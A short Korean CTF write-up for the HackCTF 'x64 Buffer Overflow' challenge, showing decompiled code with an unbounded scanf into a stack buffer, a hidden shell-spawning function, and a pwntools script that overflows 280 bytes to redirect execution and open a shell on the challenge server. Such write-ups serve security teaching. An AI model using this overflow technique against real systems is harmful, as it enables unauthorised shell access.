---


---

<h1 id="hackctfx64-buffer-overflow">HackCTF:x64 Buffer Overflow</h1>
<h2 id="section">2019-08-12</h2>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", &amp;s, envp);
  v5 = strlen(&amp;s);
  printf("Hello %s\n", &amp;s);
  return 0;
}
</code></pre>
<p>scanf() 함수로 272byte 의 배열 s에 입력을 받은 뒤 printf() 함수로 배열 s를 출력한다.</p>
<pre><code>int callMeMaybe()
{
  char *path; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  path = "/bin/bash";
  v2 = "-p";
  v3 = 0LL;
  return execve("/bin/bash", &amp;path, 0LL);
}
</code></pre>
<p>프로그램의 내부에 callMeMaybe()라는 쉘을 호출하는 함수가 포함되어있다.<br>
이번 공격 목표는 scanf()로 BOF 시킨 뒤 RET애 callMeMaybe()를 올리는 것이다.</p>
<p>주의 할 점은 x64에서 SFP의 용량은 8byte이다.</p>
<pre><code>from pwn import *
p = remote('ctf.j0n9hyun.xyz', 3004)
e = ELF('./64bof_basic')

callme = e.sym.callMeMaybe

payload = ''
payload += "A" * 280
payload += p64(callme)

p.sendline(payload)
p.interactive()
</code></pre>

